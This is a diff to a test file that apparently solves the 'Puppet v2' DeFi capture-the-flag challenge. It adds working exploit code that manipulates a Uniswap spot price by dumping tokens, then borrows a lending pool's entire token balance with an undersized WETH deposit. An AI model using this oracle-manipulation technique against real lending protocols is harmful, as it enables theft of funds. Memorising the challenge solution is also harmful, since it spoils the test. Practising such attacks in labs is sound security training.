@@ -81,7 +81,33 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT -- SOLVED */
+        /** 
+         * manipulate price on exchange by swapping 10,000 tokens for ~10 eth
+         * 
+         * borrow all tokens from the pool
+         * */
+        
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            0,
+            [
+                this.token.address,
+                this.weth.address
+            ],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp + 1
+        );
+
+        const depositRequired = await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther("1000000"));
+        
+        // convert eth to weth; approve weth to lending pool;
+        await this.weth.connect(attacker).deposit({ value: depositRequired });
+        await this.weth.connect(attacker).approve(this.lendingPool.address, depositRequired);
+        
+        // borrow all tokens
+        await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther("1000000"));
     });
 
     after(async function () {
